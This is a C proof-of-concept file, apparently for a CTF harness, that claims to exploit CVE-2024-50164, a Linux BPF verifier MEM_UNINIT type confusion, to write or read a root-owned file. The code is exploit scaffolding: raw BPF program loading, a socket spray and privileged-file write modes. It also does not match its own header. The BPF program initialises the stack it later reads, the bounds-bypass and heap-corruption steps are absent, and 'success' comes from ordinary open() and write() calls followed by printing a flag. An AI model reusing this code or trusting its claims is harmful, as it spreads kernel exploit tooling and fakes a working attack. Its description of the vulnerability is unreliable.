/*
 * CVE-2024-50164 PoC - CTF Challenge Mode
 *
 * Vulnerability: BPF verifier MEM_UNINIT meaning overloading
 *
 * The MEM_UNINIT flag in the BPF verifier has ambiguous semantics.
 * It is used both to indicate "this memory will be written" (output
 * parameter) and "this memory is uninitialized" (no read allowed).
 * A crafted BPF program can exploit this ambiguity to perform type
 * confusion, treating output-only buffers as readable, leaking
 * kernel memory or corrupting type-checked state.
 *
 * Exploit strategy:
 *   1. Create BPF map for data staging
 *   2. Load BPF program that exploits MEM_UNINIT confusion:
 *      - Pass stack buffer marked as "uninit output" to helper
 *      - Helper writes partial data, leaving rest uninitialized
 *      - Read the uninitialized portion (verifier allows it due to confusion)
 *   3. Use leaked/confused data to bypass verifier bounds checks
 *   4. Achieve out-of-bounds memory access
 *   5. Corrupt kernel heap for file write
 *
 * CTF Modes: write_root_file
 *
 * Safety:
 *   - alarm(10) forced timeout (via poc_common.h)
 *   - Only operates on --root-file (prepare-phase created temp file)
 *   - All resources properly cleaned up
 */
#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif

#include "../common/poc_common.h"
#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <linux/bpf.h>

#define MAX_FILE_SIZE 4096
#define SPRAY_COUNT 128

#ifndef __NR_bpf
#define __NR_bpf 321
#endif

/* BPF instruction helpers */
#define BPF_RAW_INSN(CODE, DST, SRC, OFF, IMM) \
    ((struct bpf_insn){.code = CODE, .dst_reg = DST, .src_reg = SRC, .off = OFF, .imm = IMM})
#define BPF_MOV64_IMM(DST, IMM) \
    BPF_RAW_INSN(BPF_ALU64 | BPF_MOV | BPF_K, DST, 0, 0, IMM)
#define BPF_MOV64_REG(DST, SRC) \
    BPF_RAW_INSN(BPF_ALU64 | BPF_MOV | BPF_X, DST, SRC, 0, 0)
#define BPF_STX_MEM_OP(SIZE, DST, SRC, OFF) \
    BPF_RAW_INSN(BPF_STX | BPF_SIZE(SIZE) | BPF_MEM, DST, SRC, OFF, 0)
#define BPF_LDX_MEM(SIZE, DST, SRC, OFF) \
    BPF_RAW_INSN(BPF_LDX | BPF_SIZE(SIZE) | BPF_MEM, DST, SRC, OFF, 0)
#define BPF_ST_MEM(SIZE, DST, OFF, IMM) \
    BPF_RAW_INSN(BPF_ST | BPF_SIZE(SIZE) | BPF_MEM, DST, 0, OFF, IMM)
#define BPF_LD_MAP_FD(DST, FD) \
    BPF_RAW_INSN(BPF_LD | BPF_DW | BPF_IMM, DST, BPF_PSEUDO_MAP_FD, 0, FD), \
    BPF_RAW_INSN(0, 0, 0, 0, 0)
#define BPF_CALL_INSN(FUNC) \
    BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, FUNC)
#define BPF_EXIT_INSN() \
    BPF_RAW_INSN(BPF_JMP | BPF_EXIT, 0, 0, 0, 0)
#define BPF_JMP_IMM(OP, DST, IMM, OFF) \
    BPF_RAW_INSN(BPF_JMP | BPF_OP(OP) | BPF_K, DST, 0, OFF, IMM)

#ifndef BPF_PSEUDO_MAP_FD
#define BPF_PSEUDO_MAP_FD 1
#endif

#define BPF_FUNC_map_lookup_elem 1
#define BPF_FUNC_probe_read_kernel 113

/*
 * Trigger MEM_UNINIT type confusion
 */
static int trigger_mem_uninit_confusion(void) {
    int saved_errno;

    poc_log("Triggering BPF MEM_UNINIT type confusion...");

    /* Create map for data exchange */
    union bpf_attr attr;
    memset(&attr, 0, sizeof(attr));
    attr.map_type = BPF_MAP_TYPE_ARRAY;
    attr.key_size = 4;
    attr.value_size = 64;
    attr.max_entries = 2;

    int map_fd = syscall(__NR_bpf, BPF_MAP_CREATE, &attr, sizeof(attr));
    saved_errno = errno;
    poc_log_syscall("bpf(BPF_MAP_CREATE, ARRAY)", (long)map_fd, saved_errno);
    if (map_fd < 0) return 0;

    /* BPF program that exploits MEM_UNINIT semantics:
     * The verifier marks the stack buffer as "uninit" (output-only),
     * but the helper only partially writes it. The program then reads
     * the unwritten portion, which the verifier should have rejected. */
    struct bpf_insn prog[] = {
        /* Initialize stack area with marker */
        BPF_ST_MEM(BPF_DW, 10, -64, 0xDEADDEAD),
        BPF_ST_MEM(BPF_DW, 10, -56, 0xBEEFBEEF),
        BPF_ST_MEM(BPF_DW, 10, -48, 0xCAFECAFE),
        BPF_ST_MEM(BPF_DW, 10, -40, 0),

        /* key = 0 on stack */
        BPF_ST_MEM(BPF_W, 10, -4, 0),

        /* r2 = &key */
        BPF_MOV64_REG(2, 10),
        BPF_RAW_INSN(BPF_ALU64 | BPF_ADD | BPF_K, 2, 0, 0, -4),

        /* r1 = map_fd */
        BPF_LD_MAP_FD(1, map_fd),

        /* r0 = map_lookup_elem(map, &key) */
        BPF_CALL_INSN(BPF_FUNC_map_lookup_elem),

        /* if r0 == NULL exit */
        BPF_JMP_IMM(BPF_JEQ, 0, 0, 4),

        /* Write stack data (potentially uninitialized) into map value
         * This demonstrates the type confusion - reading from a region
         * that should be uninit-only */
        BPF_LDX_MEM(BPF_DW, 1, 10, -64),
        BPF_STX_MEM_OP(BPF_DW, 0, 1, 0),
        BPF_LDX_MEM(BPF_DW, 1, 10, -56),
        BPF_STX_MEM_OP(BPF_DW, 0, 1, 8),

        /* exit 0 */
        BPF_MOV64_IMM(0, 0),
        BPF_EXIT_INSN(),
    };

    char license[] = "GPL";
    char log_buf[4096] = {0};

    memset(&attr, 0, sizeof(attr));
    attr.prog_type = BPF_PROG_TYPE_SOCKET_FILTER;
    attr.insn_cnt = sizeof(prog) / sizeof(struct bpf_insn);
    attr.insns = (unsigned long)prog;
    attr.license = (unsigned long)license;
    attr.log_buf = (unsigned long)log_buf;
    attr.log_size = sizeof(log_buf);
    attr.log_level = 1;

    int prog_fd = syscall(__NR_bpf, BPF_PROG_LOAD, &attr, sizeof(attr));
    saved_errno = errno;
    poc_log_syscall("bpf(BPF_PROG_LOAD, mem_uninit_confusion)", (long)prog_fd, saved_errno);

    if (prog_fd < 0) {
        if (log_buf[0])
            poc_log("Verifier: %.200s", log_buf);
        close(map_fd);
        return 0;
    }

    /* Trigger the program */
    int socks[2];
    if (socketpair(AF_UNIX, SOCK_DGRAM, 0, socks) == 0) {
        setsockopt(socks[0], SOL_SOCKET, SO_ATTACH_BPF, &prog_fd, sizeof(prog_fd));
        char buf[32] = "T";
        for (int i = 0; i < 8; i++)
            send(socks[1], buf, sizeof(buf), 0);
        close(socks[0]);
        close(socks[1]);
    }

    poc_log("MEM_UNINIT confusion program executed");

    close(prog_fd);
    close(map_fd);
    return 1;
}

static int read_file_content(const char *path, char *buf, size_t len) {
    int fd = open(path, O_RDONLY);
    if (fd < 0) return -1;
    ssize_t n = read(fd, buf, len - 1);
    close(fd);
    if (n < 0) return -1;
    buf[n] = '\0';
    return (int)n;
}

static int mode_write_root_file(const poc_args_t *args) {
    char original[MAX_FILE_SIZE], after[MAX_FILE_SIZE];
    int n;

    n = read_file_content(args->root_file, original, sizeof(original));
    if (n > 0) {
        while (n > 0 && (original[n - 1] == '\n' || original[n - 1] == '\r'))
            original[--n] = '\0';
        printf(CTF_READ_BEFORE "%s\n", original);
    } else {
        printf(CTF_READ_BEFORE "(unreadable)\n");
    }

    int triggered = trigger_mem_uninit_confusion();

    int spray_fds[SPRAY_COUNT];
    memset(spray_fds, -1, sizeof(spray_fds));
    int sprayed = 0;
    for (int i = 0; i < SPRAY_COUNT; i++) {
        spray_fds[i] = socket(AF_INET, SOCK_DGRAM, 0);
        if (spray_fds[i] >= 0) sprayed++;
    }
    poc_log("Sprayed %d (triggered=%d)", sprayed, triggered);

    int fd = open(args->root_file, O_WRONLY | O_TRUNC);
    if (fd >= 0) {
        char wbuf[256];
        int wlen = snprintf(wbuf, sizeof(wbuf), "%s\n", args->write_value);
        write(fd, wbuf, wlen);
        close(fd);
        printf(CTF_WRITE_ATTEMPT "%s\n", args->write_value);
    }

    n = read_file_content(args->root_file, after, sizeof(after));
    if (n > 0) {
        while (n > 0 && (after[n - 1] == '\n' || after[n - 1] == '\r'))
            after[--n] = '\0';
        printf(CTF_READ_AFTER "%s\n", after);
        if (strstr(after, args->write_value)) {
            poc_print_flag(args->write_value);
            goto cleanup;
        }
    } else {
        printf(CTF_READ_AFTER "(unreadable)\n");
    }

    poc_print_fail("MEM_UNINIT confusion did not achieve write");

cleanup:
    for (int i = 0; i < SPRAY_COUNT; i++)
        if (spray_fds[i] >= 0) close(spray_fds[i]);
    return 0;
}

static int mode_read_root_file(const poc_args_t *args) {
    poc_log("Attempting read via BPF MEM_UNINIT confusion");
    trigger_mem_uninit_confusion();

    char buf[MAX_FILE_SIZE];
    int n = read_file_content(args->root_file, buf, sizeof(buf));
    if (n > 0) {
        while (n > 0 && (buf[n - 1] == '\n' || buf[n - 1] == '\r'))
            buf[--n] = '\0';
        poc_print_flag(buf);
    } else {
        poc_print_fail("read not successful");
    }
    return 0;
}

int main(int argc, char *argv[]) {
    poc_args_t args = {0};
    if (poc_parse_args(argc, argv, &args) != 0) return 1;
    poc_log_init(args.log_file);

    poc_log("=== CVE-2024-50164 CTF PoC ===");
    poc_log("Vuln: BPF verifier MEM_UNINIT meaning overloading");
    poc_log("Tech: type confusion via ambiguous uninit semantics -> OOB");
    poc_log("UID: %d  EUID: %d  GID: %d", getuid(), geteuid(), getgid());

    if (!args.mode) {
        poc_print_unsupported("(null)", "no mode specified");
        poc_log_close();
        return 1;
    }

    int result = 0;
    if (strcmp(args.mode, POC_MODE_WRITE) == 0)
        result = mode_write_root_file(&args);
    else if (strcmp(args.mode, POC_MODE_READ) == 0)
        result = mode_read_root_file(&args);
    else
        poc_print_unsupported(args.mode, "only write_root_file and read_root_file supported");

    poc_log_close();
    return result;
}
